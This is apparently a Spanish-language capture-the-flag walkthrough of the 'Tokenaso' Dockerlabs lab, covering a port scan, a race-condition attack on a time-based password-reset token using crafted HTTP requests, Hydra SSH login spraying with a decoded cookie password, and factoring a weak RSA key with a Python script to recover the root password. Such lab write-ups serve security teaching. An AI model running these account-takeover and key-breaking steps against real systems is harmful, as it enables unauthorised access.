---
icon: flag
---

# CTF Tokenaso Intermediate

## Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip tokenaso.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_run.sh tokenaso.tar
```

Info:

```
██████╗ ██╗    ██╗███╗   ██╗██████╗ ██████╗ ██╗
██╔══██╗██║    ██║████╗  ██║╚════██╗██╔══██╗██║
██████╔╝██║ █╗ ██║██╔██╗ ██║ █████╔╝██║  ██║██║
██╔═══╝ ██║███╗██║██║╚██╗██║ ╚═══██╗██║  ██║╚═╝
██║     ╚███╔███╔╝██║ ╚████║██████╔╝██████╔╝██╗
╚═╝      ╚══╝╚══╝ ╚═╝  ╚═══╝╚═════╝ ╚═════╝ ╚═╝

          ==                           
         @+:@ @##@                     
          @++:-----+@ @@#+:----:+#     
           #-+-----:+:---------:       
            *::-----++-----::::#       
             ::------+:--------:       
             #-+------+:-::-----#@     
              *::+=@@#++-------::@     
              @+=     @++::+#@@@#*#    
               #-@                     
                *+#++@                 
               +-:::+-@                
               :-:+:::+                
              @+::*::::                
             *::++-::*                 
          =:--:-:++ @-#                
      #*:---:--++@   @@                
      @::-:--++*                       
       @::-:++#                        
         *++*                          

 :: Plataforma de máquinas vulnerables ::
 :: Desarrollado por Pwn3d! y Dockerlabs - creado por @d1se0 ::

 █▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
 █           FLAG{Pwn3d!_is_awesome!}            █
 █▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█


[✔] bc ya está instalado.

[✔] Docker ya está instalado
[!] Limpiando previos contenedores e imágenes
[✔] Cargando la máquina virtual      
[✔] Activando máquina virtual      

[✔] Máquina activa. Dirección IP: 172.17.0.2
[!] Presiona Ctrl+C para limpiar y salir
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-06 12:33 CET
Nmap scan report for 172.17.0.2
Host is up (0.00012s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 5f:38:90:92:99:ec:6a:f0:d1:d2:a4:ed:25:f3:ea:3a (ECDSA)
|_  256 66:b4:90:b5:bf:13:7a:a4:b8:c1:56:0f:cb:5c:2d:7b (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-title: SecureAuth Pro - Portal de Acceso
|_http-server-header: Apache/2.4.58 (Ubuntu)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.69 seconds
```

Veremos que hay un puerto `80` abierto alojando una pagina web, vamos a entrar dentro a ver que vemos.

```
URL = http://<IP>/
```

Info:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-12-06 123853.png" alt=""><figcaption></figcaption></figure>

Veremos una pagina en la que nos da unas credenciales de primeras, pero en el segundo usuario que es el que nos interesa escalar no sabemos su contraseña, por lo que vamos a iniciar sesion con el usuario `diseo` y veremos lo siguiente:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-12-06 123942.png" alt=""><figcaption></figcaption></figure>

Vemos que tenemos un `rol` normal de usuario estandar, pero nos llama la atencion que tiene un sistema de `TOKENs`, cambios de contraseña y bandeja de correo, si intentamos cambiar la contraseña se va a generar una `URL` a nuestra bandeja de correo con un `TOKEN` valido basado en tiempo durante `10 minutos`.

Justo aqui esta la vulnerabilidad, que el `TOKEN` esta basado en tiempo, por lo que si realizamos un `Race Condition` con la peticion capturada y enviamos `2` peticiones al mismo tiempo para enviarla uno al usuario `victim` y otro a nosotros tendremos la posibilidad de generar el mismo `TOKEN` para los dos usuarios, pudiendo cambiar la contraseña del usuario `victim`.

## Explotación de TOKEN basado en tiempo

Primero vamos abrir `BurpSuite` capturaremos la peticion de cambio de contraseña, viendo algo asi:

```
POST /forgot-password.php HTTP/1.1
Host: 172.17.0.2
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 84
Origin: http://172.17.0.2
DNT: 1
Connection: keep-alive
Referer: http://172.17.0.2/forgot-password.php
Cookie: PHPSESSID=rqp3m25bqqj58pr75nlqkpplf9;
Upgrade-Insecure-Requests: 1
Priority: u=0, i


csrf=06ba321b938630f316c12b51b816981f53356cf79f7212609cc9aa794ea3fefd&username=diseo
```

Enviaremos esta misma peticion `3` veces al `Repeater` con `Ctrl+R`, teniendo las `3` en el `Repeater` vamos agrupar `2` de ellas en un grupo de peticiones para ponerlas en `Paralelo` viendose algo asi:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-12-06 124754.png" alt=""><figcaption></figcaption></figure>

Ahora en la tercera peticion vamos a vaciar los campos de `csrf` y de `PHPSESSIONID` para obligar al servidor que nos genere una nueva sesion y utilizarla como `victim`.

```
POST /forgot-password.php HTTP/1.1
Host: 172.17.0.2
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 84
Origin: http://172.17.0.2
DNT: 1
Connection: keep-alive
Referer: http://172.17.0.2/forgot-password.php
Cookie: 
Upgrade-Insecure-Requests: 1
Priority: u=0, i


csrf=&username=
```

Si enviamos esto veremos lo siguiente:

<figure><img src="../../.gitbook/assets/Pasted image 20251206124937.png" alt=""><figcaption></figcaption></figure>

Vemos generados el `PHPSESSIONID` y el `csrf`, estos valores los intercambiaremos en la peticion numero `2` de esta forma:

> Peticion 2

```
POST /forgot-password.php HTTP/1.1
Host: 172.17.0.2
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 84
Origin: http://172.17.0.2
DNT: 1
Connection: keep-alive
Referer: http://172.17.0.2/forgot-password.php
Cookie: PHPSESSID=u28fee9jk44glgqb26rj9caelu;
Upgrade-Insecure-Requests: 1
Priority: u=0, i


csrf=e1df6cdf21af295f5e836be7c8d9e5dc3a5e0f1218124ed9b1d915870d7f5d86&username=diseo
```

Ahora en la peticion numero `1` vamos a modificar el `username` por el de `victim` de esta forma:

> Peticion 1

```
POST /forgot-password.php HTTP/1.1
Host: 172.17.0.2
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 84
Origin: http://172.17.0.2
DNT: 1
Connection: keep-alive
Referer: http://172.17.0.2/forgot-password.php
Cookie: PHPSESSID=rqp3m25bqqj58pr75nlqkpplf9;
Upgrade-Insecure-Requests: 1
Priority: u=0, i


csrf=06ba321b938630f316c12b51b816981f53356cf79f7212609cc9aa794ea3fefd&username=victim
```

Teniendo todo esto completado y la peticion en paralelo, vamos a enviarlas, una vez enviadas volveremos a nuestra bandeja de entrada de correo simulado y tendremos que ver solamente un correo que es el que hemos enviado.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-12-06 125228.png" alt=""><figcaption></figcaption></figure>

Vamos a pinchar en la `URL` y esto nos llevara a algo asi:

```
URL = http://<IP>//reset-password.php?token=a551d9e4c13dcf50ef666cfde5594f7fa6f8a6dee68403d63ff6f6a667d99463&username=diseo
```

Pero si el `TOKEN` se ha duplicado de forma correcta podremos cambiar el parametro `username` por `victim` en vez de `diseo`, dandole a `ENTER` tendremos que ver esto:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-12-06 125406.png" alt=""><figcaption></figcaption></figure>

Veremos que ha funcionado y podremos cambiar la contraseña a dicho usuario, una vez cambiada la contraseña, vamos a volver al `login` e iniciaremos sesion con `victim`.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-12-06 125457.png" alt=""><figcaption></figcaption></figure>

Vemos que ha funcionado, ahora seremos `admin`, pero si investigamos un poco mas a fondo veremos que en nuestra seccion de `Cookies` tenemos esto:

## Escalate user admin

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-12-06 125535.png" alt=""><figcaption></figcaption></figure>

Se nos ha generado un `admin_token` que esta codificado en `Base64`, por lo que vamos a decodificarlo de esta forma:

```shell
echo 'UEBzc3cwcmQhVXNlcjRkbTFuMjAyNSEjLQ==' | base64 -d
```

Info:

```
P@ssw0rd!User4dm1n2025!#-
```

Vemos lo que parece ser una contraseña, podemos intuir que puede ser de algun usuario por `SSH` pero no sabemos ningun usuario, vamos a crear una mini lista para porbar con varios que podrian ser.

> users.txt

```
victim
diseo
admin
admin_token
```

### Hydra

Ahora vamos a lanzar un ataque de `hydra`.

```shell
hydra -L users.txt -p 'P@ssw0rd!User4dm1n2025!#-' ssh://<IP> -t 64 -I
```

Info:

```
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-12-06 12:59:32
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 4 tasks per 1 server, overall 4 tasks, 4 login tries (l:4/p:1), ~1 try per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: admin   password: P@ssw0rd!User4dm1n2025!#-
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-12-06 12:59:37
```

Veremos que ha funcionado con el usuario `admin`, por lo que vamos a conectarnos por `SSH`.

### SSH

```shell
ssh admin@<IP>
```

Metemos como contraseña `P@ssw0rd!User4dm1n2025!#-`...

```
Welcome to Ubuntu 24.04.3 LTS (GNU/Linux 6.16.8+kali-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Sat Dec  6 10:55:04 2025 from 172.17.0.1
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

admin@a1e77f397785:~$ whoami
admin
```

Con esto veremos que estaremos dentro.

## Escalate Privileges

Si listamos la carpeta actual en la que estamos veremos una carpeta oculta llamada `.mail` que contiene lo siguiente:

```
total 20
drwxr-xr-x 2 root  root  4096 Dec  6 10:59 .
drwxr-x--- 4 admin admin 4096 Dec  6 10:55 ..
-rw-r--r-- 1 root  root   822 Dec  6 10:58 mail.txt
-rw-r--r-- 1 root  root    33 Dec  6 10:42 password.enc
-rw-r--r-- 1 root  root   138 Dec  6 10:42 public.key
```

Vemos que hay un archivo llamado `mail.txt` que dice lo siguiente:

> mail.txt

```
From: admin@securecorp.local
To: backup-team@securecorp.local
Subject: Credenciales nuevo sistema de backup
Date: Sat Dec  6 10:58:07 CET 2025

Hola equipo,

El nuevo sistema de backup interno está operativo en el puerto 6499.
Por seguridad, hemos implementado autenticación con RSA.

Credenciales de acceso:
- Usuario: admin
- Contraseña: [CIFRADA - ver archivo adjunto password.enc]

La clave pública RSA (256 bits) está disponible en el directorio /shared/keys/
Para acceder al sistema, necesitarán la clave privada correspondiente.

NOTA IMPORTANTE: El sistema de backup solo acepta conexiones desde la red interna.
Si necesitan acceso remoto, usen el túnel SSH configurado.

Saludos,
Carlos M.
Jefe de Infraestructura
SecureCorp Technologies

---
CONFIDENCIAL: Esta información es para uso interno exclusivo.
```

Esto nos da a entender que el archivo cifrado de `password.enc` esta cifrado por `RSA`, pero tambien vemos una clave publica llamada `public.key` si la leemos...

> public.key

```
-----BEGIN PUBLIC KEY-----
MD0wDQYJKoZIhvcNAQEBBQADLAAwKQIiANaV031/v8/EnUflRmq6MzASwwX2D1f6
hwS3zEvFdWYaRwIDAQAB
-----END PUBLIC KEY-----
```

Vemos que es cortita por lo que podremos probar a romper el cifrado `RSA` mediante esta clave publica.

### Romper cifrado RSA

Primero vamos a obtener los valores de `n` y de `e` que son importantes, para ellos nos montaremos un pequeño script en `python3`.

Pero antes nos pasaremos los `2` archivos mediante un servidor de `python3` a la maquina atacante, hecho eso podremos proseguir con todo lo demas.

> getE.py

```python
#!/bin/env python3

from Crypto.PublicKey import RSA

f = open("public.key")

key = RSA.importKey(f.read())

print("Valor de e: ", key.e)
```

> getN.py

```python
#!/bin/env python3

from Crypto.PublicKey import RSA

f = open("public.key")

key = RSA.importKey(f.read())

print("Valor de n: ", key.n)
```

Ahora vamos a ejecutarlo de esta forma:

```shell
#Antes vamos a instalarnos dependencias
python3 -m venv .venv
source .venv/bin/activate
pip install pycryptodome pwn Crypto

#Ejecutar comando
python3 getE.py ; python3 getN.py
```

Info:

```
Valor de e:  65537
Valor de n:  24847275382117647445670623168180131191156970685583298187336041821113046102579783
```

Ahora sabiendo estos valores tendremos que factorizar el numero del valor `n` para poder sacar los valores de `p` y `q`, esto es posible ya que el numero es pequeño (Clave publica corta).

URL = [Pagina factorizar numeros](https://factordb.com/index.php?query=24847275382117647445670623168180131191156970685583298187336041821113046102579783)

Ahora si nos metemos en esa pagina y en la `query` pegamos el numero del valor `n` veremos que nos saca los dos valores de forma correcta.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-12-06 131101.png" alt=""><figcaption></figcaption></figure>

```
q = 4146162919458530168953357282201621124057
p = 5992836235524142758386850633773258681119
```

Ahora tendremos que buscar en internet el algoritmo para generar nuestra clave privada y poder decodificar el archivo, este algoritmo para calcular todo es una funcion modular multiplicativa inversa que es necesaria para todo esto, la encontraremos en esta pagina.

URL = [Funcion modular multiplicativa inversa](https://stackoverflow.com/questions/4798654/modular-multiplicative-inverse-function-in-python)

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-12-06 131520.png" alt=""><figcaption></figcaption></figure>

Nos tendremos que copiar esa pequeña funcion y ahora vamos a montarnos el script final para generar nuestra clave privada de esta forma:

> generateRSA.py

```python
#!/bin/env python3

from Crypto.PublicKey import RSA
from pwn import *

q = 4146162919458530168953357282201621124057
p = 5992836235524142758386850633773258681119
n = p*q
e = 65537
m = n-(p+q-1)

def egcd(a, b):
    if a == 0:
        return (b, 0, 1)
    else:
        g, y, x = egcd(b % a, a)
        return (g, x - (b // a) * y, y)

def modinv(a, m):
    g, x, y = egcd(a, m)
    if g != 1:
        raise Exception('modular inverse does not exist')
    else:
        return x % m

d = modinv(e, m)

key = RSA.construct((n, e, d, p, q))
print(key.exportKey().decode())
```

Ahora vamos ejecutarlo de esta forma:

```shell
python3 generateRSA.py
```

Info:

```
-----BEGIN RSA PRIVATE KEY-----
MIGvAgEAAiIA1pXTfX+/z8SdR+VGarozMBLDBfYPV/qHBLfMS8V1ZhpHAgMBAAEC
IgCxXeITx7Yp69/8/zv3F7UbnKWR5r51YFKUlkYHMVCYXiECERGcgkaZjLjWPW4M
+1dxkKsfAhEMLznunWfUiGMO1PE3VnZT2QIRCBqrYG2ccho0XoYeyxh5aCUCEQCX
isj8/L5moelmjxGRMc6BAhEFOTdnQFXCvn1ENFShCtr2vw==
-----END RSA PRIVATE KEY-----
```

Vemos que nos genera bien la clave, por lo que vamos a utilizar `openssl` para poder decodificar ese `password.enc` pero antes lo guardaremos todo esto en un archivo llamado `private.key`.

```shell
python3 generateRSA.py > private.key
```

Ahora vamos teniendo todo esto vamos a decodificarlo de esta forma:

```shell
openssl pkeyutl -decrypt -inkey private.key -in password.enc
```

Info:

```
P@ssw0rd!2025
```

Vemos que ha funcionado, por lo que probaremos esta contraseña con el usuario `root` a ver si funciona.

```shell
su root
```

Metemos como contraseña `P@ssw0rd!2025`...

```
root@a1e77f397785:/home/admin/.mail# whoami
root
```

Con esto veremos que ya seremos `root`, por lo que habremos terminado la maquina.
